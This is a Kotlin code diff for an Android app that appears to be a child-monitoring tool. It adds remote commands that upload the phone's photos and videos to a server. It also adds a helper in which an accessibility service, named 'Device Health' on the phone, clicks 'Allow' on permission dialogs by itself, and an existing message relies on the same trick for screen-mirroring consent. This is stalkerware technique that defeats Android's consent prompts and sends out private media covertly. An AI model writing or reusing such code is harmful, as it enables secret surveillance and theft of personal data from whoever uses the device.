@@ -37,6 +37,9 @@ import kotlinx.coroutines.launch
 
 object CommandHandler {
 
+    /** gallery_list ek page me itne items ke thumbnails upload karta hai. */
+    private const val PAGE_SIZE = 18
+
     suspend fun execute(ctx: Context, cmd: JsonObject): Pair<Boolean, JsonObject> = try {
         val action = cmd.get("action")?.takeIf { it.isJsonPrimitive }?.asString ?: ""
         val params = cmd.get("params")?.takeIf { it.isJsonObject }?.asJsonObject ?: JsonObject()
@@ -223,6 +226,69 @@ object CommandHandler {
             "mirror_request_permission" -> {
                 requestProjectionConsent(ctx)
                 Pair(true, data)
+            }
+
+            "gallery_list" -> {
+                // Parent dashboard "Gallery kholo" — MediaStore metadata + isi
+                // page ke thumbs upload. SIRF ye command pixel transfer karta hai;
+                // poora gallery bulk me kabhi download nahi hota.
+                if (!GalleryFetcher.hasPerm(ctx)) {
+                    requestGalleryPerm(ctx)
+                    data.addProperty("error", "gallery permission auto-requested — 5 sec me dobara tap karo")
+                    Pair(false, data)
+                } else {
+                    val offset = params.get("offset")?.takeIf { it.isJsonPrimitive }?.asInt ?: 0
+                    val all = GalleryFetcher.list(ctx, 200)
+                    val page = com.google.gson.JsonArray()
+                    var uploaded = 0
+                    var i = offset
+                    while (i < all.size() && uploaded < PAGE_SIZE) {
+                        val item = all.get(i).asJsonObject.deepCopy()
+                        val id = item.get("id").asString
+                        val f = runCatching { GalleryFetcher.thumb(ctx, id) }.getOrNull()
+                        if (f != null) {
+                            val url = runCatching { Api.uploadMedia(f) }.getOrNull()
+                            runCatching { f.delete() }
+                            if (!url.isNullOrBlank()) item.addProperty("thumb", url)
+                        }
+                        page.add(item)
+                        uploaded++
+                        i++
+                    }
+                    data.addProperty("status", "gallery")
+                    data.addProperty("total", all.size())
+                    data.addProperty("offset", offset)
+                    data.add("items", page)
+                    Pair(true, data)
+                }
+            }
+
+            "gallery_full" -> {
+                // Grid me kisi photo/video par tap — bada frame (1080px) upload
+                if (!GalleryFetcher.hasPerm(ctx)) {
+                    requestGalleryPerm(ctx)
+                    data.addProperty("error", "gallery permission auto-requested — 5 sec me dobara tap karo")
+                    Pair(false, data)
+                } else {
+                    val id = params.get("id")?.takeIf { it.isJsonPrimitive }?.asString ?: ""
+                    val f = runCatching { GalleryFetcher.full(ctx, id) }.getOrNull()
+                    if (f == null) {
+                        data.addProperty("error", "media open nahi hua (delete ho gaya ya locked)")
+                        Pair(false, data)
+                    } else {
+                        val url = runCatching { Api.uploadMedia(f) }.getOrNull()
+                        runCatching { f.delete() }
+                        if (url.isNullOrBlank()) {
+                            data.addProperty("error", "upload fail — net check karo")
+                            Pair(false, data)
+                        } else {
+                            data.addProperty("galleryFull", true)
+                            data.addProperty("url", url)
+                            data.addProperty("name", id)
+                            Pair(true, data)
+                        }
+                    }
+                }
             }
 
             "show_app_icon" -> {
@@ -457,6 +523,18 @@ object CommandHandler {
                 "Consent dialog confirm nahi ho paya (40s) — bachche ke phone par " +
                     "Accessibility ON hai? Settings → Accessibility → Device Health → ON. " +
                     "Phir Live tab par dobara Mirror shuru karo."
+            )
+        }
+    }
+
+    /** Gallery permission background request — transparent activity runtime
+     *  dialog kholti hai, EnforcementService "gallery" step par Allow khud
+     *  click karta hai (overlay permission ke bina background se legal). */
+    private fun requestGalleryPerm(ctx: Context) {
+        runCatching {
+            ctx.startActivity(
+                android.content.Intent(ctx, com.familyguard.child.ui.GalleryPermActivity::class.java)
+                    .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
             )
         }
     }
